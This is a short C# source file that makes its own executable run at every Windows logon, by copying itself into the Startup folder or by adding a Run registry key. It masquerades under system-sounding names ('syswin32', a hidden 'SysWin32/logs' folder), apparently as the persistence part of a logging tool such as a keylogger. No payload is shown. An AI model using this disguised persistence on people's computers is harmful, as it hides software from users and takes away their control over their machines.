using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApp2.Startup
{
    class Startup
    {
        // directory of log file
        private static string logDir = @"/SysWin32/logs";
        // path to the executable
        private static string _exePath = String.Empty;
        // startup folder
        private static string _startup = String.Empty;

        public static string GetStartupDirectory()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        }

        public static string GetAppDataFolder()
        {
            return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        }

        public static void Init()
        {
            _exePath = Application.ExecutablePath;
            _startup = GetStartupDirectory();

            string syswin = GetAppDataFolder() + logDir;
            if (!Directory.Exists(syswin)) {
                Directory.CreateDirectory(syswin);
            }
            AddToStartup();
        }

        /// <summary>
        ///     Add the program to the startup folder if it exists, otherwise add it to the registry
        /// </summary>
        /// <returns> Doesn't return a value </returns>
        public static void AddToStartup()
        {
            if ( _startup == "" ) {
                RegistryKey rk;
                try {
                    rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    rk.SetValue("syswin32", _exePath);
                }
                catch (Exception)
                {
                }
                return;
            }
            string startupPath = _startup + @"/" + Path.GetFileName(_exePath);
            if (!System.IO.File.Exists(startupPath)) {
                System.IO.File.Copy(_exePath, startupPath);
            }
        }
    }
}
